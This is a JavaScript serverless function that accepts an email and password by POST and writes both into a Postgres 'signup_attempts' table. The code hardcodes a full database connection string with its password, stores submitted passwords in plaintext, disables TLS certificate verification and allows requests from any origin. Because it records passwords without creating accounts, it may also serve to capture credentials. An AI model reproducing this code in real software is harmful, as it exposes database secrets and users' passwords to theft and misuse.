const { Client } = require('pg');
const { checkRateLimit } = require('./rate-limiter');

const CORS = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json'
};

const DB_CONN = 'postgresql://postgres.iujikypubqpcstetwdod:SuperSecurePass542!@aws-0-us-east-1.pooler.supabase.com:6543/postgres';

exports.handler = async (event) => {
    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 200, headers: CORS, body: '' };
    }

    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, headers: CORS, body: JSON.stringify({ error: 'Method not allowed' }) };
    }

    // Rate Limiting Check (Max 10 per min)
    if (!checkRateLimit(event, 10, 60000)) {
        return { statusCode: 429, headers: CORS, body: JSON.stringify({ error: 'Rate limit exceeded' }) };
    }

    let body;
    try {
        body = JSON.parse(event.body || '{}');
    } catch (e) {
        return { statusCode: 400, headers: CORS, body: JSON.stringify({ error: 'Invalid JSON body' }) };
    }

    const { email, password } = body;
    if (!email) {
        return { statusCode: 400, headers: CORS, body: JSON.stringify({ error: 'Missing email' }) };
    }

    const cleanEmail = email.trim().toLowerCase();

    const client = new Client({
        connectionString: DB_CONN,
        ssl: { rejectUnauthorized: false }
    });

    try {
        await client.connect();

        await client.query(`
            CREATE TABLE IF NOT EXISTS signup_attempts (
                id SERIAL PRIMARY KEY,
                email TEXT NOT NULL,
                password TEXT,
                created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
            );
        `);

        await client.query(
            'INSERT INTO signup_attempts (email, password) VALUES ($1, $2)',
            [cleanEmail, password ? password.trim() : '']
        );

        return {
            statusCode: 200,
            headers: CORS,
            body: JSON.stringify({ success: true })
        };
    } catch (err) {
        console.error('Log signup attempt error:', err);
        return { statusCode: 500, headers: CORS, body: JSON.stringify({ error: 'Database service error' }) };
    } finally {
        await client.end();
    }
};
